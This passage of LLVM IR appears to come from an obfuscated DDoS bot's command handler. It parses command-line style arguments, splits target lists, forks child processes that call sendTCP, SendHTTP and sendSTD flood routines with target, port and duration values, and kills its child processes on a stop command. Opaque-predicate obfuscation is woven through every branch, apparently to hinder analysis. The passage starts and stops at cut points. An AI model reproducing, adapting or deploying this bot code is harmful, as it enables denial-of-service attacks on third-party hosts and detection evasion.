; <label>:480:                                    ; preds = %originalBBpart252
  %481 = load i32, i32* @x.103
  %482 = load i32, i32* @y.104
  %483 = sub i32 %481, 1
  %484 = mul i32 %481, %483
  %485 = urem i32 %484, 2
  %486 = icmp eq i32 %485, 0
  %487 = icmp slt i32 %482, 10
  %488 = or i1 %486, %487
  br i1 %488, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %480
  %489 = load i32, i32* %11, align 4
  %490 = icmp sgt i32 %489, 6
  %491 = load i32, i32* @x.103
  %492 = load i32, i32* @y.104
  %493 = sub i32 %491, 1
  %494 = mul i32 %491, %493
  %495 = urem i32 %494, 2
  %496 = icmp eq i32 %495, 0
  %497 = icmp slt i32 %492, 10
  %498 = or i1 %496, %497
  br i1 %498, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %490, label %499, label %521

; <label>:499:                                    ; preds = %originalBBpart256
  %500 = load i32, i32* @x.103
  %501 = load i32, i32* @y.104
  %502 = sub i32 %500, 1
  %503 = mul i32 %500, %502
  %504 = urem i32 %503, 2
  %505 = icmp eq i32 %504, 0
  %506 = icmp slt i32 %501, 10
  %507 = or i1 %505, %506
  br i1 %507, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %499
  %508 = load i8**, i8*** %12, align 8
  %509 = getelementptr inbounds i8*, i8** %508, i64 6
  %510 = load i8*, i8** %509, align 8
  %511 = call i32 @atoi(i8* %510) #9
  %512 = icmp slt i32 %511, 0
  %513 = load i32, i32* @x.103
  %514 = load i32, i32* @y.104
  %515 = sub i32 %513, 1
  %516 = mul i32 %513, %515
  %517 = urem i32 %516, 2
  %518 = icmp eq i32 %517, 0
  %519 = icmp slt i32 %514, 10
  %520 = or i1 %518, %519
  br i1 %520, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %512, label %530, label %521

; <label>:521:                                    ; preds = %originalBBpart260, %originalBBpart256
  %522 = load i32, i32* %11, align 4
  %523 = icmp eq i32 %522, 8
  br i1 %523, label %524, label %547

; <label>:524:                                    ; preds = %521
  %525 = load i8**, i8*** %12, align 8
  %526 = getelementptr inbounds i8*, i8** %525, i64 7
  %527 = load i8*, i8** %526, align 8
  %528 = call i32 @atoi(i8* %527) #9
  %529 = icmp slt i32 %528, 1
  br i1 %529, label %530, label %547

; <label>:530:                                    ; preds = %524, %originalBBpart260, %originalBBpart252, %originalBBpart248, %430, %424, %421
  %531 = load i32, i32* @x.103
  %532 = load i32, i32* @y.104
  %533 = sub i32 %531, 1
  %534 = mul i32 %531, %533
  %535 = urem i32 %534, 2
  %536 = icmp eq i32 %535, 0
  %537 = icmp slt i32 %532, 10
  %538 = or i1 %536, %537
  br i1 %538, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %530
  %539 = load i32, i32* @x.103
  %540 = load i32, i32* @y.104
  %541 = sub i32 %539, 1
  %542 = mul i32 %539, %541
  %543 = urem i32 %542, 2
  %544 = icmp eq i32 %543, 0
  %545 = icmp slt i32 %540, 10
  %546 = or i1 %544, %545
  br i1 %546, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %1042

; <label>:547:                                    ; preds = %524, %521
  %548 = load i8**, i8*** %12, align 8
  %549 = getelementptr inbounds i8*, i8** %548, i64 1
  %550 = load i8*, i8** %549, align 8
  store i8* %550, i8** %25, align 8
  %551 = load i8**, i8*** %12, align 8
  %552 = getelementptr inbounds i8*, i8** %551, i64 2
  %553 = load i8*, i8** %552, align 8
  %554 = call i32 @atoi(i8* %553) #9
  store i32 %554, i32* %26, align 4
  %555 = load i8**, i8*** %12, align 8
  %556 = getelementptr inbounds i8*, i8** %555, i64 3
  %557 = load i8*, i8** %556, align 8
  %558 = call i32 @atoi(i8* %557) #9
  store i32 %558, i32* %27, align 4
  %559 = load i8**, i8*** %12, align 8
  %560 = getelementptr inbounds i8*, i8** %559, i64 4
  %561 = load i8*, i8** %560, align 8
  %562 = call i32 @atoi(i8* %561) #9
  store i32 %562, i32* %28, align 4
  %563 = load i8**, i8*** %12, align 8
  %564 = getelementptr inbounds i8*, i8** %563, i64 5
  %565 = load i8*, i8** %564, align 8
  store i8* %565, i8** %29, align 8
  %566 = load i32, i32* %11, align 4
  %567 = icmp eq i32 %566, 8
  br i1 %567, label %568, label %589

; <label>:568:                                    ; preds = %547
  %569 = load i32, i32* @x.103
  %570 = load i32, i32* @y.104
  %571 = sub i32 %569, 1
  %572 = mul i32 %569, %571
  %573 = urem i32 %572, 2
  %574 = icmp eq i32 %573, 0
  %575 = icmp slt i32 %570, 10
  %576 = or i1 %574, %575
  br i1 %576, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %568
  %577 = load i8**, i8*** %12, align 8
  %578 = getelementptr inbounds i8*, i8** %577, i64 7
  %579 = load i8*, i8** %578, align 8
  %580 = call i32 @atoi(i8* %579) #9
  %581 = load i32, i32* @x.103
  %582 = load i32, i32* @y.104
  %583 = sub i32 %581, 1
  %584 = mul i32 %581, %583
  %585 = urem i32 %584, 2
  %586 = icmp eq i32 %585, 0
  %587 = icmp slt i32 %582, 10
  %588 = or i1 %586, %587
  br i1 %588, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br label %590

; <label>:589:                                    ; preds = %547
  br label %590

; <label>:590:                                    ; preds = %589, %originalBBpart268
  %591 = phi i32 [ %580, %originalBBpart268 ], [ 10, %589 ]
  store i32 %591, i32* %30, align 4
  %592 = load i32, i32* %11, align 4
  %593 = icmp sgt i32 %592, 6
  br i1 %593, label %594, label %599

; <label>:594:                                    ; preds = %590
  %595 = load i8**, i8*** %12, align 8
  %596 = getelementptr inbounds i8*, i8** %595, i64 6
  %597 = load i8*, i8** %596, align 8
  %598 = call i32 @atoi(i8* %597) #9
  br label %600

; <label>:599:                                    ; preds = %590
  br label %600

; <label>:600:                                    ; preds = %599, %594
  %601 = phi i32 [ %598, %594 ], [ 0, %599 ]
  %602 = load i32, i32* @x.103
  %603 = load i32, i32* @y.104
  %604 = sub i32 %602, 1
  %605 = mul i32 %602, %604
  %606 = urem i32 %605, 2
  %607 = icmp eq i32 %606, 0
  %608 = icmp slt i32 %603, 10
  %609 = or i1 %607, %608
  br i1 %609, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %600
  store i32 %601, i32* %31, align 4
  %610 = load i8*, i8** %25, align 8
  %611 = call i8* @strstr(i8* %610, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #9
  %612 = icmp ne i8* %611, null
  %613 = load i32, i32* @x.103
  %614 = load i32, i32* @y.104
  %615 = sub i32 %613, 1
  %616 = mul i32 %613, %615
  %617 = urem i32 %616, 2
  %618 = icmp eq i32 %617, 0
  %619 = icmp slt i32 %614, 10
  %620 = or i1 %618, %619
  br i1 %620, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %612, label %621, label %673

; <label>:621:                                    ; preds = %originalBBpart272
  %622 = load i8*, i8** %25, align 8
  %623 = call i8* @strtok(i8* %622, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #3
  store i8* %623, i8** %32, align 8
  br label %624

; <label>:624:                                    ; preds = %654, %621
  %625 = load i8*, i8** %32, align 8
  %626 = icmp ne i8* %625, null
  br i1 %626, label %627, label %656

; <label>:627:                                    ; preds = %624
  %628 = load i32, i32* @x.103
  %629 = load i32, i32* @y.104
  %630 = sub i32 %628, 1
  %631 = mul i32 %628, %630
  %632 = urem i32 %631, 2
  %633 = icmp eq i32 %632, 0
  %634 = icmp slt i32 %629, 10
  %635 = or i1 %633, %634
  br i1 %635, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %627
  %636 = call i32 @listFork()
  %637 = icmp ne i32 %636, 0
  %638 = load i32, i32* @x.103
  %639 = load i32, i32* @y.104
  %640 = sub i32 %638, 1
  %641 = mul i32 %638, %640
  %642 = urem i32 %641, 2
  %643 = icmp eq i32 %642, 0
  %644 = icmp slt i32 %639, 10
  %645 = or i1 %643, %644
  br i1 %645, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %637, label %654, label %646

; <label>:646:                                    ; preds = %originalBBpart276
  %647 = load i8*, i8** %32, align 8
  %648 = load i32, i32* %26, align 4
  %649 = load i32, i32* %27, align 4
  %650 = load i32, i32* %28, align 4
  %651 = load i8*, i8** %29, align 8
  %652 = load i32, i32* %31, align 4
  %653 = load i32, i32* %30, align 4
  call void @sendTCP(i8* %647, i32 %648, i32 %649, i32 %650, i8* %651, i32 %652, i32 %653)
  call void @_exit(i32 0) #12
  unreachable

; <label>:654:                                    ; preds = %originalBBpart276
  %655 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #3
  store i8* %655, i8** %32, align 8
  br label %624

; <label>:656:                                    ; preds = %624
  %657 = load i32, i32* @x.103
  %658 = load i32, i32* @y.104
  %659 = sub i32 %657, 1
  %660 = mul i32 %657, %659
  %661 = urem i32 %660, 2
  %662 = icmp eq i32 %661, 0
  %663 = icmp slt i32 %658, 10
  %664 = or i1 %662, %663
  br i1 %664, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %656
  %665 = load i32, i32* @x.103
  %666 = load i32, i32* @y.104
  %667 = sub i32 %665, 1
  %668 = mul i32 %665, %667
  %669 = urem i32 %668, 2
  %670 = icmp eq i32 %669, 0
  %671 = icmp slt i32 %666, 10
  %672 = or i1 %670, %671
  br i1 %672, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %685

; <label>:673:                                    ; preds = %originalBBpart272
  %674 = call i32 @listFork()
  %675 = icmp ne i32 %674, 0
  br i1 %675, label %684, label %676

; <label>:676:                                    ; preds = %673
  %677 = load i8*, i8** %25, align 8
  %678 = load i32, i32* %26, align 4
  %679 = load i32, i32* %27, align 4
  %680 = load i32, i32* %28, align 4
  %681 = load i8*, i8** %29, align 8
  %682 = load i32, i32* %31, align 4
  %683 = load i32, i32* %30, align 4
  call void @sendTCP(i8* %677, i32 %678, i32 %679, i32 %680, i8* %681, i32 %682, i32 %683)
  call void @_exit(i32 0) #12
  unreachable

; <label>:684:                                    ; preds = %673
  br label %685

; <label>:685:                                    ; preds = %684, %originalBBpart280
  br label %686

; <label>:686:                                    ; preds = %685, %415
  %687 = load i32, i32* @x.103
  %688 = load i32, i32* @y.104
  %689 = sub i32 %687, 1
  %690 = mul i32 %687, %689
  %691 = urem i32 %690, 2
  %692 = icmp eq i32 %691, 0
  %693 = icmp slt i32 %688, 10
  %694 = or i1 %692, %693
  br i1 %694, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %686
  %695 = load i8**, i8*** %12, align 8
  %696 = getelementptr inbounds i8*, i8** %695, i64 0
  %697 = load i8*, i8** %696, align 8
  %698 = call i32 @strcmp(i8* %697, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.130, i32 0, i32 0)) #9
  %699 = icmp ne i32 %698, 0
  %700 = load i32, i32* @x.103
  %701 = load i32, i32* @y.104
  %702 = sub i32 %700, 1
  %703 = mul i32 %700, %702
  %704 = urem i32 %703, 2
  %705 = icmp eq i32 %704, 0
  %706 = icmp slt i32 %701, 10
  %707 = or i1 %705, %706
  br i1 %707, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %699, label %783, label %708

; <label>:708:                                    ; preds = %originalBBpart284
  %709 = load i32, i32* %11, align 4
  %710 = icmp slt i32 %709, 6
  br i1 %710, label %739, label %711

; <label>:711:                                    ; preds = %708
  %712 = load i32, i32* @x.103
  %713 = load i32, i32* @y.104
  %714 = sub i32 %712, 1
  %715 = mul i32 %712, %714
  %716 = urem i32 %715, 2
  %717 = icmp eq i32 %716, 0
  %718 = icmp slt i32 %713, 10
  %719 = or i1 %717, %718
  br i1 %719, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %711
  %720 = load i8**, i8*** %12, align 8
  %721 = getelementptr inbounds i8*, i8** %720, i64 3
  %722 = load i8*, i8** %721, align 8
  %723 = call i32 @atoi(i8* %722) #9
  %724 = icmp slt i32 %723, 1
  %725 = load i32, i32* @x.103
  %726 = load i32, i32* @y.104
  %727 = sub i32 %725, 1
  %728 = mul i32 %725, %727
  %729 = urem i32 %728, 2
  %730 = icmp eq i32 %729, 0
  %731 = icmp slt i32 %726, 10
  %732 = or i1 %730, %731
  br i1 %732, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %724, label %739, label %733

; <label>:733:                                    ; preds = %originalBBpart288
  %734 = load i8**, i8*** %12, align 8
  %735 = getelementptr inbounds i8*, i8** %734, i64 5
  %736 = load i8*, i8** %735, align 8
  %737 = call i32 @atoi(i8* %736) #9
  %738 = icmp slt i32 %737, 1
  br i1 %738, label %739, label %740

; <label>:739:                                    ; preds = %733, %originalBBpart288, %708
  br label %1042

; <label>:740:                                    ; preds = %733
  %741 = load i32, i32* @x.103
  %742 = load i32, i32* @y.104
  %743 = sub i32 %741, 1
  %744 = mul i32 %741, %743
  %745 = urem i32 %744, 2
  %746 = icmp eq i32 %745, 0
  %747 = icmp slt i32 %742, 10
  %748 = or i1 %746, %747
  br i1 %748, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %740
  %749 = call i32 @listFork()
  %750 = icmp ne i32 %749, 0
  %751 = load i32, i32* @x.103
  %752 = load i32, i32* @y.104
  %753 = sub i32 %751, 1
  %754 = mul i32 %751, %753
  %755 = urem i32 %754, 2
  %756 = icmp eq i32 %755, 0
  %757 = icmp slt i32 %752, 10
  %758 = or i1 %756, %757
  br i1 %758, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %750, label %759, label %760

; <label>:759:                                    ; preds = %originalBBpart292
  br label %1042

; <label>:760:                                    ; preds = %originalBBpart292
  %761 = load i8**, i8*** %12, align 8
  %762 = getelementptr inbounds i8*, i8** %761, i64 1
  %763 = load i8*, i8** %762, align 8
  %764 = load i8**, i8*** %12, align 8
  %765 = getelementptr inbounds i8*, i8** %764, i64 2
  %766 = load i8*, i8** %765, align 8
  %767 = load i8**, i8*** %12, align 8
  %768 = getelementptr inbounds i8*, i8** %767, i64 3
  %769 = load i8*, i8** %768, align 8
  %770 = call i32 @atoi(i8* %769) #9
  %771 = trunc i32 %770 to i16
  %772 = load i8**, i8*** %12, align 8
  %773 = getelementptr inbounds i8*, i8** %772, i64 4
  %774 = load i8*, i8** %773, align 8
  %775 = load i8**, i8*** %12, align 8
  %776 = getelementptr inbounds i8*, i8** %775, i64 5
  %777 = load i8*, i8** %776, align 8
  %778 = call i32 @atoi(i8* %777) #9
  %779 = load i8**, i8*** %12, align 8
  %780 = getelementptr inbounds i8*, i8** %779, i64 6
  %781 = load i8*, i8** %780, align 8
  %782 = call i32 @atoi(i8* %781) #9
  call void @SendHTTP(i8* %763, i8* %766, i16 zeroext %771, i8* %774, i32 %778, i32 %782)
  call void @exit(i32 0) #11
  unreachable

; <label>:783:                                    ; preds = %originalBBpart284
  %784 = load i32, i32* @x.103
  %785 = load i32, i32* @y.104
  %786 = sub i32 %784, 1
  %787 = mul i32 %784, %786
  %788 = urem i32 %787, 2
  %789 = icmp eq i32 %788, 0
  %790 = icmp slt i32 %785, 10
  %791 = or i1 %789, %790
  br i1 %791, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %783
  %792 = load i8**, i8*** %12, align 8
  %793 = getelementptr inbounds i8*, i8** %792, i64 0
  %794 = load i8*, i8** %793, align 8
  %795 = call i32 @strcmp(i8* %794, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.131, i32 0, i32 0)) #9
  %796 = icmp ne i32 %795, 0
  %797 = load i32, i32* @x.103
  %798 = load i32, i32* @y.104
  %799 = sub i32 %797, 1
  %800 = mul i32 %797, %799
  %801 = urem i32 %800, 2
  %802 = icmp eq i32 %801, 0
  %803 = icmp slt i32 %798, 10
  %804 = or i1 %802, %803
  br i1 %804, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %796, label %957, label %805

; <label>:805:                                    ; preds = %originalBBpart296
  %806 = load i32, i32* @x.103
  %807 = load i32, i32* @y.104
  %808 = sub i32 %806, 1
  %809 = mul i32 %806, %808
  %810 = urem i32 %809, 2
  %811 = icmp eq i32 %810, 0
  %812 = icmp slt i32 %807, 10
  %813 = or i1 %811, %812
  br i1 %813, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %805
  %814 = load i32, i32* %11, align 4
  %815 = icmp slt i32 %814, 4
  %816 = load i32, i32* @x.103
  %817 = load i32, i32* @y.104
  %818 = sub i32 %816, 1
  %819 = mul i32 %816, %818
  %820 = urem i32 %819, 2
  %821 = icmp eq i32 %820, 0
  %822 = icmp slt i32 %817, 10
  %823 = or i1 %821, %822
  br i1 %823, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %815, label %852, label %824

; <label>:824:                                    ; preds = %originalBBpart2100
  %825 = load i8**, i8*** %12, align 8
  %826 = getelementptr inbounds i8*, i8** %825, i64 2
  %827 = load i8*, i8** %826, align 8
  %828 = call i32 @atoi(i8* %827) #9
  %829 = icmp slt i32 %828, 1
  br i1 %829, label %852, label %830

; <label>:830:                                    ; preds = %824
  %831 = load i32, i32* @x.103
  %832 = load i32, i32* @y.104
  %833 = sub i32 %831, 1
  %834 = mul i32 %831, %833
  %835 = urem i32 %834, 2
  %836 = icmp eq i32 %835, 0
  %837 = icmp slt i32 %832, 10
  %838 = or i1 %836, %837
  br i1 %838, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %830
  %839 = load i8**, i8*** %12, align 8
  %840 = getelementptr inbounds i8*, i8** %839, i64 3
  %841 = load i8*, i8** %840, align 8
  %842 = call i32 @atoi(i8* %841) #9
  %843 = icmp slt i32 %842, 1
  %844 = load i32, i32* @x.103
  %845 = load i32, i32* @y.104
  %846 = sub i32 %844, 1
  %847 = mul i32 %844, %846
  %848 = urem i32 %847, 2
  %849 = icmp eq i32 %848, 0
  %850 = icmp slt i32 %845, 10
  %851 = or i1 %849, %850
  br i1 %851, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %843, label %852, label %853

; <label>:852:                                    ; preds = %originalBBpart2104, %824, %originalBBpart2100
  br label %1042

; <label>:853:                                    ; preds = %originalBBpart2104
  %854 = load i8**, i8*** %12, align 8
  %855 = getelementptr inbounds i8*, i8** %854, i64 1
  %856 = load i8*, i8** %855, align 8
  store i8* %856, i8** %33, align 8
  %857 = load i8**, i8*** %12, align 8
  %858 = getelementptr inbounds i8*, i8** %857, i64 2
  %859 = load i8*, i8** %858, align 8
  %860 = call i32 @atoi(i8* %859) #9
  store i32 %860, i32* %34, align 4
  %861 = load i8**, i8*** %12, align 8
  %862 = getelementptr inbounds i8*, i8** %861, i64 3
  %863 = load i8*, i8** %862, align 8
  %864 = call i32 @atoi(i8* %863) #9
  store i32 %864, i32* %35, align 4
  %865 = load i8*, i8** %33, align 8
  %866 = call i8* @strstr(i8* %865, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #9
  %867 = icmp ne i8* %866, null
  br i1 %867, label %868, label %916

; <label>:868:                                    ; preds = %853
  %869 = load i8*, i8** %33, align 8
  %870 = call i8* @strtok(i8* %869, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #3
  store i8* %870, i8** %36, align 8
  br label %871

; <label>:871:                                    ; preds = %897, %868
  %872 = load i32, i32* @x.103
  %873 = load i32, i32* @y.104
  %874 = sub i32 %872, 1
  %875 = mul i32 %872, %874
  %876 = urem i32 %875, 2
  %877 = icmp eq i32 %876, 0
  %878 = icmp slt i32 %873, 10
  %879 = or i1 %877, %878
  br i1 %879, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %871
  %880 = load i8*, i8** %36, align 8
  %881 = icmp ne i8* %880, null
  %882 = load i32, i32* @x.103
  %883 = load i32, i32* @y.104
  %884 = sub i32 %882, 1
  %885 = mul i32 %882, %884
  %886 = urem i32 %885, 2
  %887 = icmp eq i32 %886, 0
  %888 = icmp slt i32 %883, 10
  %889 = or i1 %887, %888
  br i1 %889, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %881, label %890, label %899

; <label>:890:                                    ; preds = %originalBBpart2108
  %891 = call i32 @listFork()
  %892 = icmp ne i32 %891, 0
  br i1 %892, label %897, label %893

; <label>:893:                                    ; preds = %890
  %894 = load i8*, i8** %36, align 8
  %895 = load i32, i32* %34, align 4
  %896 = load i32, i32* %35, align 4
  call void @sendSTD(i8* %894, i32 %895, i32 %896)
  call void @_exit(i32 0) #12
  unreachable

; <label>:897:                                    ; preds = %890
  %898 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #3
  store i8* %898, i8** %36, align 8
  br label %871

; <label>:899:                                    ; preds = %originalBBpart2108
  %900 = load i32, i32* @x.103
  %901 = load i32, i32* @y.104
  %902 = sub i32 %900, 1
  %903 = mul i32 %900, %902
  %904 = urem i32 %903, 2
  %905 = icmp eq i32 %904, 0
  %906 = icmp slt i32 %901, 10
  %907 = or i1 %905, %906
  br i1 %907, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %899
  %908 = load i32, i32* @x.103
  %909 = load i32, i32* @y.104
  %910 = sub i32 %908, 1
  %911 = mul i32 %908, %910
  %912 = urem i32 %911, 2
  %913 = icmp eq i32 %912, 0
  %914 = icmp slt i32 %909, 10
  %915 = or i1 %913, %914
  br i1 %915, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br label %956

; <label>:916:                                    ; preds = %853
  %917 = call i32 @listFork()
  %918 = icmp ne i32 %917, 0
  br i1 %918, label %919, label %936

; <label>:919:                                    ; preds = %916
  %920 = load i32, i32* @x.103
  %921 = load i32, i32* @y.104
  %922 = sub i32 %920, 1
  %923 = mul i32 %920, %922
  %924 = urem i32 %923, 2
  %925 = icmp eq i32 %924, 0
  %926 = icmp slt i32 %921, 10
  %927 = or i1 %925, %926
  br i1 %927, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %919
  %928 = load i32, i32* @x.103
  %929 = load i32, i32* @y.104
  %930 = sub i32 %928, 1
  %931 = mul i32 %928, %930
  %932 = urem i32 %931, 2
  %933 = icmp eq i32 %932, 0
  %934 = icmp slt i32 %929, 10
  %935 = or i1 %933, %934
  br i1 %935, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br label %1042

; <label>:936:                                    ; preds = %916
  %937 = load i32, i32* @x.103
  %938 = load i32, i32* @y.104
  %939 = sub i32 %937, 1
  %940 = mul i32 %937, %939
  %941 = urem i32 %940, 2
  %942 = icmp eq i32 %941, 0
  %943 = icmp slt i32 %938, 10
  %944 = or i1 %942, %943
  br i1 %944, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %936
  %945 = load i8*, i8** %33, align 8
  %946 = load i32, i32* %34, align 4
  %947 = load i32, i32* %35, align 4
  call void @sendSTD(i8* %945, i32 %946, i32 %947)
  call void @_exit(i32 0) #12
  %948 = load i32, i32* @x.103
  %949 = load i32, i32* @y.104
  %950 = sub i32 %948, 1
  %951 = mul i32 %948, %950
  %952 = urem i32 %951, 2
  %953 = icmp eq i32 %952, 0
  %954 = icmp slt i32 %949, 10
  %955 = or i1 %953, %954
  br i1 %955, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  unreachable

; <label>:956:                                    ; preds = %originalBBpart2112
  br label %957

; <label>:957:                                    ; preds = %956, %originalBBpart296
  %958 = load i32, i32* @x.103
  %959 = load i32, i32* @y.104
  %960 = sub i32 %958, 1
  %961 = mul i32 %958, %960
  %962 = urem i32 %961, 2
  %963 = icmp eq i32 %962, 0
  %964 = icmp slt i32 %959, 10
  %965 = or i1 %963, %964
  br i1 %965, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %957
  %966 = load i8**, i8*** %12, align 8
  %967 = getelementptr inbounds i8*, i8** %966, i64 0
  %968 = load i8*, i8** %967, align 8
  %969 = call i32 @strcmp(i8* %968, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.132, i32 0, i32 0)) #9
  %970 = icmp ne i32 %969, 0
  %971 = load i32, i32* @x.103
  %972 = load i32, i32* @y.104
  %973 = sub i32 %971, 1
  %974 = mul i32 %971, %973
  %975 = urem i32 %974, 2
  %976 = icmp eq i32 %975, 0
  %977 = icmp slt i32 %972, 10
  %978 = or i1 %976, %977
  br i1 %978, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %970, label %1042, label %979

; <label>:979:                                    ; preds = %originalBBpart2124
  store i32 0, i32* %37, align 4
  store i64 0, i64* %38, align 8
  br label %980

; <label>:980:                                    ; preds = %1038, %979
  %981 = load i64, i64* %38, align 8
  %982 = load i64, i64* @numpids, align 8
  %983 = icmp ult i64 %981, %982
  br i1 %983, label %984, label %1041

; <label>:984:                                    ; preds = %980
  %985 = load i32, i32* @x.103
  %986 = load i32, i32* @y.104
  %987 = sub i32 %985, 1
  %988 = mul i32 %985, %987
  %989 = urem i32 %988, 2
  %990 = icmp eq i32 %989, 0
  %991 = icmp slt i32 %986, 10
  %992 = or i1 %990, %991
  br i1 %992, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %984
  %993 = load i32*, i32** @pids, align 8
  %994 = load i64, i64* %38, align 8
  %995 = getelementptr inbounds i32, i32* %993, i64 %994
  %996 = load i32, i32* %995, align 4
  %997 = icmp ne i32 %996, 0
  %998 = load i32, i32* @x.103
  %999 = load i32, i32* @y.104
  %1000 = sub i32 %998, 1
  %1001 = mul i32 %998, %1000
  %1002 = urem i32 %1001, 2
  %1003 = icmp eq i32 %1002, 0
  %1004 = icmp slt i32 %999, 10
  %1005 = or i1 %1003, %1004
  br i1 %1005, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %997, label %1006, label %1037

; <label>:1006:                                   ; preds = %originalBBpart2128
  %1007 = load i32*, i32** @pids, align 8
  %1008 = load i64, i64* %38, align 8
  %1009 = getelementptr inbounds i32, i32* %1007, i64 %1008
  %1010 = load i32, i32* %1009, align 4
  %1011 = call i32 @getpid() #3
  %1012 = icmp ne i32 %1010, %1011
  br i1 %1012, label %1013, label %1037

; <label>:1013:                                   ; preds = %1006
  %1014 = load i32, i32* @x.103
  %1015 = load i32, i32* @y.104
  %1016 = sub i32 %1014, 1
  %1017 = mul i32 %1014, %1016
  %1018 = urem i32 %1017, 2
  %1019 = icmp eq i32 %1018, 0
  %1020 = icmp slt i32 %1015, 10
  %1021 = or i1 %1019, %1020
  br i1 %1021, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1013
  %1022 = load i32*, i32** @pids, align 8
  %1023 = load i64, i64* %38, align 8
  %1024 = getelementptr inbounds i32, i32* %1022, i64 %1023
  %1025 = load i32, i32* %1024, align 4
  %1026 = call i32 @kill(i32 %1025, i32 9) #3
  %1027 = load i32, i32* %37, align 4
  %1028 = add nsw i32 %1027, 1
  store i32 %1028, i32* %37, align 4
  %1029 = load i32, i32* @x.103
  %1030 = load i32, i32* @y.104
  %1031 = sub i32 %1029, 1
  %1032 = mul i32 %1029, %1031
  %1033 = urem i32 %1032, 2
  %1034 = icmp eq i32 %1033, 0
  %1035 = icmp slt i32 %1030, 10
  %1036 = or i1 %1034, %1035
  br i1 %1036, label %originalBBpart2140, label %originalBB130alteredBB

originalBBpart2140:                               ; preds = %originalBB130
  br label %1037

; <label>:1037:                                   ; preds = %originalBBpart2140, %1006, %originalBBpart2128
  br label %1038

; <label>:1038:                                   ; preds = %1037
  %1039 = load i64, i64* %38, align 8
  %1040 = add i64 %1039, 1
  store i64 %1040, i64* %38, align 8
  br label %980

; <label>:1041:                                   ; preds = %980
  br label %1042

; <label>:1042:                                   ; preds = %1041, %originalBBpart2124, %originalBBpart2116, %852, %759, %739, %originalBBpart264, %414, %262, %116, %originalBBpart28, %90, %61
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %1043 = alloca i32, align 4
  %1044 = alloca i8**, align 8
  %1045 = alloca i32, align 4
  %1046 = alloca i32, align 4
  %1047 = alloca i32, align 4
  %1048 = alloca i8*, align 8
  %1049 = alloca i32, align 4
  %1050 = alloca i32, align 4
  %1051 = alloca i32, align 4
  %1052 = alloca i32, align 4
  %1053 = alloca i32, align 4
  %1054 = alloca i32, align 4
  %1055 = alloca i32, align 4
  %1056 = alloca i8*, align 8
